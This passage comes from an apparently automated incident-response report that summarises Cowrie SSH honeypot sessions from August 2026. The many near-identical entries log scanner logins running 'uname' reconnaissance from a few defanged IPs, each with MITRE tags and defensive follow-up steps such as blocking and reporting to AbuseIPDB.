| `2026-08-16 18:38:59` | `cowrie.client.version` |
| `2026-08-16 18:38:59` | `cowrie.client.kex` |
| `2026-08-16 18:38:59` | `cowrie.login.success` |
| `2026-08-16 18:39:00` | `cowrie.session.params` |
| `2026-08-16 18:39:00` | `cowrie.command.input` |
| `2026-08-16 18:39:00` | `cowrie.log.closed` |
| `2026-08-16 18:39:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d46c061d916

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:39 |
| **Last Seen** | 2026-08-16 18:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:39:03` | `cowrie.session.connect` |
| `2026-08-16 18:39:03` | `cowrie.client.version` |
| `2026-08-16 18:39:03` | `cowrie.client.kex` |
| `2026-08-16 18:39:03` | `cowrie.login.success` |
| `2026-08-16 18:39:04` | `cowrie.session.params` |
| `2026-08-16 18:39:04` | `cowrie.command.input` |
| `2026-08-16 18:39:04` | `cowrie.log.closed` |
| `2026-08-16 18:39:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17468193c2d1

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:39 |
| **Last Seen** | 2026-08-16 18:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:39:07` | `cowrie.session.connect` |
| `2026-08-16 18:39:07` | `cowrie.client.version` |
| `2026-08-16 18:39:08` | `cowrie.client.kex` |
| `2026-08-16 18:39:08` | `cowrie.login.success` |
| `2026-08-16 18:39:09` | `cowrie.session.params` |
| `2026-08-16 18:39:09` | `cowrie.command.input` |
| `2026-08-16 18:39:09` | `cowrie.log.closed` |
| `2026-08-16 18:39:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-483fa5ffdf5b

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:39 |
| **Last Seen** | 2026-08-16 18:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:39:12` | `cowrie.session.connect` |
| `2026-08-16 18:39:12` | `cowrie.client.version` |
| `2026-08-16 18:39:12` | `cowrie.client.kex` |
| `2026-08-16 18:39:12` | `cowrie.login.success` |
| `2026-08-16 18:39:13` | `cowrie.session.params` |
| `2026-08-16 18:39:13` | `cowrie.command.input` |
| `2026-08-16 18:39:13` | `cowrie.log.closed` |
| `2026-08-16 18:39:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15c41f6d9165

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:39 |
| **Last Seen** | 2026-08-16 18:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:39:16` | `cowrie.session.connect` |
| `2026-08-16 18:39:16` | `cowrie.client.version` |
| `2026-08-16 18:39:16` | `cowrie.client.kex` |
| `2026-08-16 18:39:17` | `cowrie.login.success` |
| `2026-08-16 18:39:18` | `cowrie.session.params` |
| `2026-08-16 18:39:18` | `cowrie.command.input` |
| `2026-08-16 18:39:18` | `cowrie.log.closed` |
| `2026-08-16 18:39:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc20035e7084

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:39 |
| **Last Seen** | 2026-08-16 18:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:39:21` | `cowrie.session.connect` |
| `2026-08-16 18:39:21` | `cowrie.client.version` |
| `2026-08-16 18:39:21` | `cowrie.client.kex` |
| `2026-08-16 18:39:21` | `cowrie.login.success` |
| `2026-08-16 18:39:22` | `cowrie.session.params` |
| `2026-08-16 18:39:22` | `cowrie.command.input` |
| `2026-08-16 18:39:22` | `cowrie.log.closed` |
| `2026-08-16 18:39:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad6c1dcb8406

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:39 |
| **Last Seen** | 2026-08-16 18:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:39:25` | `cowrie.session.connect` |
| `2026-08-16 18:39:25` | `cowrie.client.version` |
| `2026-08-16 18:39:25` | `cowrie.client.kex` |
| `2026-08-16 18:39:25` | `cowrie.login.success` |
| `2026-08-16 18:39:26` | `cowrie.session.params` |
| `2026-08-16 18:39:26` | `cowrie.command.input` |
| `2026-08-16 18:39:26` | `cowrie.log.closed` |
| `2026-08-16 18:39:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7b12f6698f3

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:39 |
| **Last Seen** | 2026-08-16 18:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:39:29` | `cowrie.session.connect` |
| `2026-08-16 18:39:29` | `cowrie.client.version` |
| `2026-08-16 18:39:29` | `cowrie.client.kex` |
| `2026-08-16 18:39:30` | `cowrie.login.success` |
| `2026-08-16 18:39:30` | `cowrie.session.params` |
| `2026-08-16 18:39:30` | `cowrie.command.input` |
| `2026-08-16 18:39:31` | `cowrie.log.closed` |
| `2026-08-16 18:39:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff3de33ec230

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:39 |
| **Last Seen** | 2026-08-16 18:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:39:34` | `cowrie.session.connect` |
| `2026-08-16 18:39:34` | `cowrie.client.version` |
| `2026-08-16 18:39:34` | `cowrie.client.kex` |
| `2026-08-16 18:39:34` | `cowrie.login.success` |
| `2026-08-16 18:39:35` | `cowrie.session.params` |
| `2026-08-16 18:39:35` | `cowrie.command.input` |
| `2026-08-16 18:39:35` | `cowrie.log.closed` |
| `2026-08-16 18:39:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-689409b05050

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:39 |
| **Last Seen** | 2026-08-16 18:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:39:38` | `cowrie.session.connect` |
| `2026-08-16 18:39:38` | `cowrie.client.version` |
| `2026-08-16 18:39:38` | `cowrie.client.kex` |
| `2026-08-16 18:39:38` | `cowrie.login.success` |
| `2026-08-16 18:39:39` | `cowrie.session.params` |
| `2026-08-16 18:39:39` | `cowrie.command.input` |
| `2026-08-16 18:39:39` | `cowrie.log.closed` |
| `2026-08-16 18:39:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65aa37827757

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:39 |
| **Last Seen** | 2026-08-16 18:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:39:42` | `cowrie.session.connect` |
| `2026-08-16 18:39:42` | `cowrie.client.version` |
| `2026-08-16 18:39:42` | `cowrie.client.kex` |
| `2026-08-16 18:39:42` | `cowrie.login.success` |
| `2026-08-16 18:39:43` | `cowrie.session.params` |
| `2026-08-16 18:39:43` | `cowrie.command.input` |
| `2026-08-16 18:39:43` | `cowrie.log.closed` |
| `2026-08-16 18:39:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9e8927dcbf0

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:39 |
| **Last Seen** | 2026-08-16 18:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:39:46` | `cowrie.session.connect` |
| `2026-08-16 18:39:46` | `cowrie.client.version` |
| `2026-08-16 18:39:46` | `cowrie.client.kex` |
| `2026-08-16 18:39:47` | `cowrie.login.success` |
| `2026-08-16 18:39:47` | `cowrie.session.params` |
| `2026-08-16 18:39:47` | `cowrie.command.input` |
| `2026-08-16 18:39:47` | `cowrie.log.closed` |
| `2026-08-16 18:39:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-622cb2e6b797

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:39 |
| **Last Seen** | 2026-08-16 18:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:39:50` | `cowrie.session.connect` |
| `2026-08-16 18:39:50` | `cowrie.client.version` |
| `2026-08-16 18:39:50` | `cowrie.client.kex` |
| `2026-08-16 18:39:50` | `cowrie.login.success` |
| `2026-08-16 18:39:51` | `cowrie.session.params` |
| `2026-08-16 18:39:51` | `cowrie.command.input` |
| `2026-08-16 18:39:51` | `cowrie.log.closed` |
| `2026-08-16 18:39:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9667246d8e8

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:39 |
| **Last Seen** | 2026-08-16 18:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:39:53` | `cowrie.session.connect` |
| `2026-08-16 18:39:53` | `cowrie.client.version` |
| `2026-08-16 18:39:54` | `cowrie.client.kex` |
| `2026-08-16 18:39:54` | `cowrie.login.success` |
| `2026-08-16 18:39:55` | `cowrie.session.params` |
| `2026-08-16 18:39:55` | `cowrie.command.input` |
| `2026-08-16 18:39:55` | `cowrie.log.closed` |
| `2026-08-16 18:39:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6afc0c9b5488

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:39 |
| **Last Seen** | 2026-08-16 18:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:39:57` | `cowrie.session.connect` |
| `2026-08-16 18:39:57` | `cowrie.client.version` |
| `2026-08-16 18:39:57` | `cowrie.client.kex` |
| `2026-08-16 18:39:58` | `cowrie.login.success` |
| `2026-08-16 18:39:58` | `cowrie.session.params` |
| `2026-08-16 18:39:58` | `cowrie.command.input` |
| `2026-08-16 18:39:58` | `cowrie.log.closed` |
| `2026-08-16 18:39:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e1a16fc1fca

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:40 |
| **Last Seen** | 2026-08-16 18:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:40:01` | `cowrie.session.connect` |
| `2026-08-16 18:40:01` | `cowrie.client.version` |
| `2026-08-16 18:40:01` | `cowrie.client.kex` |
| `2026-08-16 18:40:01` | `cowrie.login.success` |
| `2026-08-16 18:40:02` | `cowrie.session.params` |
| `2026-08-16 18:40:02` | `cowrie.command.input` |
| `2026-08-16 18:40:02` | `cowrie.log.closed` |
| `2026-08-16 18:40:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24164d411c7e

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:40 |
| **Last Seen** | 2026-08-16 18:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:40:05` | `cowrie.session.connect` |
| `2026-08-16 18:40:05` | `cowrie.client.version` |
| `2026-08-16 18:40:05` | `cowrie.client.kex` |
| `2026-08-16 18:40:05` | `cowrie.login.success` |
| `2026-08-16 18:40:06` | `cowrie.session.params` |
| `2026-08-16 18:40:06` | `cowrie.command.input` |
| `2026-08-16 18:40:06` | `cowrie.log.closed` |
| `2026-08-16 18:40:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c521445f4a15

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:40 |
| **Last Seen** | 2026-08-16 18:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:40:11` | `cowrie.session.connect` |
| `2026-08-16 18:40:11` | `cowrie.client.version` |
| `2026-08-16 18:40:11` | `cowrie.client.kex` |
| `2026-08-16 18:40:11` | `cowrie.login.success` |
| `2026-08-16 18:40:12` | `cowrie.session.params` |
| `2026-08-16 18:40:12` | `cowrie.command.input` |
| `2026-08-16 18:40:12` | `cowrie.log.closed` |
| `2026-08-16 18:40:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c77836df3564

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:40 |
| **Last Seen** | 2026-08-16 18:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:40:16` | `cowrie.session.connect` |
| `2026-08-16 18:40:16` | `cowrie.client.version` |
| `2026-08-16 18:40:16` | `cowrie.client.kex` |
| `2026-08-16 18:40:17` | `cowrie.login.success` |
| `2026-08-16 18:40:18` | `cowrie.session.params` |
| `2026-08-16 18:40:18` | `cowrie.command.input` |
| `2026-08-16 18:40:18` | `cowrie.log.closed` |
| `2026-08-16 18:40:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-414e6addbdaa

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:40 |
| **Last Seen** | 2026-08-16 18:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:40:22` | `cowrie.session.connect` |
| `2026-08-16 18:40:22` | `cowrie.client.version` |
| `2026-08-16 18:40:22` | `cowrie.client.kex` |
| `2026-08-16 18:40:23` | `cowrie.login.success` |
| `2026-08-16 18:40:23` | `cowrie.session.params` |
| `2026-08-16 18:40:23` | `cowrie.command.input` |
| `2026-08-16 18:40:23` | `cowrie.log.closed` |
| `2026-08-16 18:40:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d356594f6ffb

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:40 |
| **Last Seen** | 2026-08-16 18:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:40:28` | `cowrie.session.connect` |
| `2026-08-16 18:40:28` | `cowrie.client.version` |
| `2026-08-16 18:40:28` | `cowrie.client.kex` |
| `2026-08-16 18:40:29` | `cowrie.login.success` |
| `2026-08-16 18:40:29` | `cowrie.session.params` |
| `2026-08-16 18:40:29` | `cowrie.command.input` |
| `2026-08-16 18:40:30` | `cowrie.log.closed` |
| `2026-08-16 18:40:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e511e4a0a84

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:40 |
| **Last Seen** | 2026-08-16 18:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:40:34` | `cowrie.session.connect` |
| `2026-08-16 18:40:34` | `cowrie.client.version` |
| `2026-08-16 18:40:34` | `cowrie.client.kex` |
| `2026-08-16 18:40:35` | `cowrie.login.success` |
| `2026-08-16 18:40:35` | `cowrie.session.params` |
| `2026-08-16 18:40:35` | `cowrie.command.input` |
| `2026-08-16 18:40:36` | `cowrie.log.closed` |
| `2026-08-16 18:40:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a761dc81099

| Field | Detail |
|---|---|
| **Source IP** | `45.79.207[.]71` |
| **First Seen** | 2026-08-16 18:40 |
| **Last Seen** | 2026-08-16 18:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Accept: */*, Accept-Encoding: gzip, User-Agent: Mozilla/5.0 zgrab/0.x` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:40:37` | `cowrie.session.connect` |
| `2026-08-16 18:40:37` | `cowrie.login.success` |
| `2026-08-16 18:40:38` | `cowrie.session.params` |
| `2026-08-16 18:40:38` | `cowrie.command.input` |
| `2026-08-16 18:40:38` | `cowrie.command.failed` |
| `2026-08-16 18:40:38` | `cowrie.command.input` |
| `2026-08-16 18:40:38` | `cowrie.command.failed` |
| `2026-08-16 18:40:38` | `cowrie.command.input` |
| `2026-08-16 18:40:38` | `cowrie.command.failed` |
| `2026-08-16 18:40:38` | `cowrie.command.input` |
| `2026-08-16 18:40:38` | `cowrie.log.closed` |
| `2026-08-16 18:40:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.207[.]71` to AbuseIPDB if not already reported
- [ ] Block `45.79.207[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b8ebf5ebddc

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:40 |
| **Last Seen** | 2026-08-16 18:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:40:40` | `cowrie.session.connect` |
| `2026-08-16 18:40:40` | `cowrie.client.version` |
| `2026-08-16 18:40:40` | `cowrie.client.kex` |
| `2026-08-16 18:40:41` | `cowrie.login.success` |
| `2026-08-16 18:40:41` | `cowrie.session.params` |
| `2026-08-16 18:40:41` | `cowrie.command.input` |
| `2026-08-16 18:40:41` | `cowrie.log.closed` |
| `2026-08-16 18:40:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c74d3e08b28

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]26` |
| **First Seen** | 2026-08-16 18:40 |
| **Last Seen** | 2026-08-16 18:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:40:41` | `cowrie.session.connect` |
| `2026-08-16 18:40:41` | `cowrie.client.version` |
| `2026-08-16 18:40:41` | `cowrie.client.kex` |
| `2026-08-16 18:40:42` | `cowrie.login.success` |
| `2026-08-16 18:40:42` | `cowrie.session.params` |
| `2026-08-16 18:40:42` | `cowrie.command.input` |
| `2026-08-16 18:40:43` | `cowrie.log.closed` |
| `2026-08-16 18:40:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]26` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cbb14b1e699

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:40 |
| **Last Seen** | 2026-08-16 18:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:40:46` | `cowrie.session.connect` |
| `2026-08-16 18:40:46` | `cowrie.client.version` |
| `2026-08-16 18:40:46` | `cowrie.client.kex` |
| `2026-08-16 18:40:46` | `cowrie.login.success` |
| `2026-08-16 18:40:47` | `cowrie.session.params` |
| `2026-08-16 18:40:47` | `cowrie.command.input` |
| `2026-08-16 18:40:47` | `cowrie.log.closed` |
| `2026-08-16 18:40:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
